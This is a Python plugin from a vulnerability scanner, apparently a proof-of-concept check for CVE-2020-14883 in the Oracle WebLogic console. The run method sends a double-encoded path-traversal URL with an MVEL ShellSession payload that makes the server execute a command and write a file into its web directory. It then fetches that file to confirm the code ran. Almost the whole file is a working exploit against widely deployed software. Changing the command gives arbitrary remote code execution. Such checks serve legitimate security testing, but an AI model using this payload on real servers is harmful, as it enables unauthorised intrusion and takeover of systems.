#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-14883
# updated 2019/10/23
#


import pathlib
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server Console Privilege Escalation',
            'catalog': 'CVE-2020-14883',
            'itype': PLUGIN_TYPE.POC,
            'protocols': ['http', 'https'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        self.http.rq(
            url.join(
                '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)'
            ).string(),
            timeout=5,
        )

        err, response = self.http.rq(
            url.join('/console/framework/skins/wlsconsole/css/test.txt').string(),
            timeout=5,
        )
        if err:
            return False, err
        return response.status_code == 200, response.text[:30].strip()


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
